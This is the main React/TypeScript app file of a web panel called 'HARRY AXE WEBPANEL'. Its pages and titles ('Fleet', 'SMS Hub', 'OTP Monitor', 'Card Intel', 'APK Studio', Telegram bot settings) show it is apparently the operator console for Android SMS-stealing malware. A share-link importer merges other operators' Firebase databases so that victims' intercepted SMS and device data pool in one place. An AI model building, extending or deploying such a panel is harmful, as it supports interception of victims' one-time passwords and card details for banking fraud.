import { Route, Switch, Router as WouterRouter, useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { Component, Suspense, lazy, useEffect, type ReactNode } from "react";

// Pages — all route-split so the initial bundle stays light.
// Each page loads on demand when its route is first visited.
const Login = lazy(() =>
  import("@/pages/login").then((m) => ({ default: m.Login }))
);
const Dashboard = lazy(() =>
  import("@/pages/dashboard").then((m) => ({ default: m.Dashboard }))
);
const Subscriptions = lazy(() =>
  import("@/pages/subscriptions").then((m) => ({ default: m.Subscriptions }))
);
const Firebases = lazy(() =>
  import("@/pages/firebases").then((m) => ({ default: m.Firebases }))
);
const UserSearch = lazy(() =>
  import("@/pages/user-search").then((m) => ({ default: m.UserSearch }))
);
const ApkStudio = lazy(() =>
  import("@/pages/apk-studio").then((m) => ({ default: m.ApkStudio }))
);
const Tool = lazy(() =>
  import("@/pages/tool").then((m) => ({ default: m.Tool }))
);
const Pam = lazy(() =>
  import("@/pages/pam").then((m) => ({ default: m.Pam }))
);
const NotFound = lazy(() => import("@/pages/not-found"));

// Lazy pages (firebase SDK consumers) — code-split so the main bundle stays light
const DeviceDetail = lazy(() =>
  import("@/pages/device-detail").then((m) => ({ default: m.DeviceDetail }))
);
const AllSms = lazy(() =>
  import("@/pages/all-sms").then((m) => ({ default: m.AllSms }))
);
const ScrapedData = lazy(() =>
  import("@/pages/scraped").then((m) => ({ default: m.ScrapedData }))
);
const TelegramSettings = lazy(() =>
  import("@/pages/telegram-settings").then((m) => ({
    default: m.TelegramSettings,
  }))
);
const OtpPanel = lazy(() =>
  import("@/pages/otps").then((m) => ({ default: m.OtpPanel }))
);
const Profile = lazy(() =>
  import("@/pages/profile").then((m) => ({ default: m.Profile }))
);

// Providers
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { AuthProvider } from "@/lib/auth";
import { ThemeProvider } from "next-themes";
import { SearchProvider } from "@/lib/search";
import { authHeaders } from "@/lib/apiFetch";
import { toast } from "@/hooks/use-toast";

// Error Boundary — shows the actual error instead of a white screen
class ErrorBoundary extends Component<
  { children: ReactNode },
  { error: Error | null; hasReloaded: boolean }
> {
  state = { error: null as Error | null, hasReloaded: false };

  static getDerivedStateFromError(error: Error) {
    return { error };
  }

  componentDidCatch(error: Error) {
    if (
      error.message &&
      error.message.includes("Failed to fetch dynamically imported module") &&
      !this.state.hasReloaded
    ) {
      this.setState({ hasReloaded: true });
      window.location.reload();
    }
  }

  render() {
    if (this.state.error) {
      const e = this.state.error;
      return (
        <div className="min-h-screen bg-background text-foreground flex items-center justify-center p-6">
          <div className="w-full max-w-xl rounded-2xl border border-card-border bg-card p-6 shadow-sm">
            <p className="page-eyebrow">Panel error</p>
            <h2 className="font-display text-xl font-bold tracking-tight">Something went wrong</h2>
          <p>
            <strong>Error name:</strong> {e.name || "unknown"}
          </p>
          <p>
            <strong>Error message:</strong>{" "}
            <span className="text-destructive">
              {e.message || "(empty message)"}
            </span>
          </p>
          <hr />
          <p style={{ fontSize: 12 }}>
            <strong>Stack trace:</strong>
          </p>
          <pre className="mt-2 max-h-64 overflow-auto rounded-xl border border-card-border bg-muted p-3 font-mono text-xs leading-relaxed">
            {import.meta.env.DEV
              ? e.stack || String(e)
              : "Stack hidden in production. Check logs."}
          </pre>
          </div>
        </div>
      );
    }
    return this.props.children;
  }
}

// Auth Guard — any logged-in user
function ProtectedRoute({ component: Component, ...rest }: any) {
  const { isAuthenticated } = useAuth();
  const [, setLocation] = useLocation();

  useEffect(() => {
    if (isAuthenticated === false) setLocation("/");
  }, [isAuthenticated, setLocation]);

  if (isAuthenticated === null) {
    return (
      <div
        className="min-h-screen bg-background flex items-center justify-center text-muted-foreground"
        role="status"
        aria-live="polite"
      >
        <span className="inline-flex items-center gap-2 font-mono text-sm">
          <span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-foreground" />
          Loading…
        </span>
      </div>
    );
  }

  return isAuthenticated ? <Component {...rest} /> : null;
}

// Admin Guard — only admin
function AdminRoute({ component: Component, ...rest }: any) {
  const { isAuthenticated, isAdmin } = useAuth();
  const [, setLocation] = useLocation();

  useEffect(() => {
    if (isAuthenticated === false) setLocation("/");
    else if (isAuthenticated === true && !isAdmin) setLocation("/dashboard");
  }, [isAuthenticated, isAdmin, setLocation]);

  if (isAuthenticated === null) {
    return (
      <div
        className="min-h-screen bg-background flex items-center justify-center text-muted-foreground"
        role="status"
        aria-live="polite"
      >
        <span className="inline-flex items-center gap-2 font-mono text-sm">
          <span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-foreground" />
          Loading…
        </span>
      </div>
    );
  }

  return isAuthenticated && isAdmin ? <Component {...rest} /> : null;
}

const PANEL_NAME = "HARRY AXE WEBPANEL";

function useDocumentTitle() {
  const [location] = useLocation();
  useEffect(() => {
    const seg = location.split("/")[1] || "";
    const names: Record<string, string> = {
      dashboard: "Fleet",
      "device": "Device",
      subscriptions: "Access",
      profile: "System Config",
      "all-sms": "SMS Hub",
      firebases: "Firebases",
      otps: "OTP Monitor",
      data: "Intel Data",
      cards: "Card Intel",
      telegram: "Telegram Bot",
      "user-search": "User Search",
      "apk-studio": "APK Studio",
      tool: "Tool",
      pam: "Pam",
    };
    const label = seg === "" ? "Sign In" : names[seg] ?? "Panel";
    document.title = `${label} - ${PANEL_NAME}`;
  }, [location]);
};

function Router() {
  useDocumentTitle();
  return (
    <Suspense
      fallback={
        <div
          className="min-h-screen bg-background flex items-center justify-center text-muted-foreground"
          role="status"
          aria-live="polite"
        >
          <span className="inline-flex items-center gap-2 font-mono text-sm">
            <span className="inline-block h-4 w-4 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-foreground" />
            Loading…
          </span>
        </div>
      }
    >
      <Switch>
        <Route path="/" component={Login} />
        <Route path="/dashboard">
          {() => <ProtectedRoute component={Dashboard} />}
        </Route>
        <Route path="/device/:id">
          {() => <ProtectedRoute component={DeviceDetail} />}
        </Route>
        <Route path="/subscriptions">
          {() => <AdminRoute component={Subscriptions} />}
        </Route>
        <Route path="/profile">
          {() => <ProtectedRoute component={Profile} />}
        </Route>
        <Route path="/all-sms">
          {() => <ProtectedRoute component={AllSms} />}
        </Route>
        <Route path="/firebases">
          {() => <ProtectedRoute component={Firebases} />}
        </Route>
        <Route path="/otps">
          {() => <ProtectedRoute component={OtpPanel} />}
        </Route>
        <Route path="/data">
          {() => <ProtectedRoute component={ScrapedData} />}
        </Route>
        <Route path="/cards">
          {() => <ProtectedRoute component={ScrapedData} />}
        </Route>
        <Route path="/telegram">
          {() => <ProtectedRoute component={TelegramSettings} />}
        </Route>
        <Route path="/user-search">
          {() => <ProtectedRoute component={UserSearch} />}
        </Route>
        <Route path="/apk-studio">
          {() => <ProtectedRoute component={ApkStudio} />}
        </Route>
        <Route path="/tool">{() => <ProtectedRoute component={Tool} />}</Route>
        <Route path="/pam">{() => <AdminRoute component={Pam} />}</Route>
        <Route component={NotFound} />
      </Switch>
    </Suspense>
  );
}

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

// Mythos-style share-link import: ?s=<base64("url||apiKey")> auto-imports
// the Firebase instance so its SMS/devices aggregate into this panel.
function ShareLinkImporter() {
  const { isAuthenticated, isAdmin } = useAuth();
  const [location] = useLocation();

  useEffect(() => {
    if (!isAuthenticated || !isAdmin) return;
    const m = location.match(/[?&]s=([^&]+)/);
    if (!m) return;
    let decoded = "";
    try {
      decoded = decodeURIComponent(m[1]);
      decoded = atob(decoded);
    } catch {
      return;
    }
    const [url, key] = decoded.split("||").map((x) => x.trim());
    if (!url || !/^https:\/\/.+\.firebaseio\.com$/.test(url)) return;
    const doneKey = "parivahan-imported-" + m[1];
    try {
      if (sessionStorage.getItem(doneKey)) return;
    } catch {
      /* ignore */
    }

    (async () => {
      try {
        const proj = url.match(
          /\/\/([a-z0-9_-]+)-default-rtdb\.firebaseio\.com/
        );
        const res = await fetch(`${API_BASE}/api/firebases`, {
          method: "POST",
          headers: { "Content-Type": "application/json", ...authHeaders() },
          body: JSON.stringify({
            name: proj?.[1] || "shared-panel",
            databaseURL: url,
            apiKey: key || "",
          }),
        });
        const json = await res.json();
        try {
          sessionStorage.setItem(doneKey, "1");
        } catch {
          /* ignore */
        }
        // strip the ?s= from the URL so it doesn't re-import
        window.history.replaceState({}, "", window.location.pathname);
        if (json.success) {
          toast({
            title: "Panel imported",
            description:
              "Imported shared panel: " + (json.firebase?.name || url),
          });
        } else {
          toast({
            title: "Import failed",
            description: json.error || "unknown error",
            variant: "destructive",
          });
        }
      } catch (err: any) {
        toast({
          title: "Import failed",
          description: err?.message || "network error",
          variant: "destructive",
        });
      }
    })();
  }, [isAuthenticated, isAdmin, location]);

  return null;
}

function App() {
  return (
    <ErrorBoundary>
      <SearchProvider>
        <AuthProvider>
          <ThemeProvider attribute="class" defaultTheme="dark" enableSystem>
            <TooltipProvider>
              <WouterRouter base="">
                <ShareLinkImporter />
                <Router />
              </WouterRouter>
              <Toaster />
            </TooltipProvider>
          </ThemeProvider>
        </AuthProvider>
      </SearchProvider>
    </ErrorBoundary>
  );
}

export default App;
